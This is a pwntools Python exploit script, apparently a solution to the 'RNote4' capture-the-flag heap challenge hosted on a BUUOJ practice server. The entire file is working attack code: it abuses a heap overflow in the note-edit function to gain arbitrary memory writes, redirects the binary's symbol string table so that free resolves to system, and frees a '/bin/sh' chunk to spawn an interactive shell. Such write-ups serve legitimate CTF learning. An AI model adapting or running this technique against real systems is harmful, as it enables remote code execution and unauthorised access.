from pwn import *

debug=0
context.log_level='debug'
if debug:
    p=process('./RNote4')
    context.log_level='debug'
else:
    p=remote('node4.buuoj.cn',27501)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)


def add(sz,content):
    se('\x01')
    se(chr(sz))
    se(content)


def edit(idx,sz,content):
    se('\x02')
    se(chr(idx))
    se(chr(sz))
    se(content)

def delete(idx):
    se('\x03')
    se(chr(idx))


def write(addr,content):
    payload='a'*0x18+p64(0x21)+p64(0x18)+p64(addr)
    edit(0,len(payload),payload)
    edit(1,len(content),content)

add(0x18,'a'*0x18)
add(0x18,'b'*0x18)
add(0x8,'/bin/sh\x00')

write(0x601EB0,p64(0x602100))
write(0x602100,'a'*0x5F+'system')
delete(2)
p.interactive()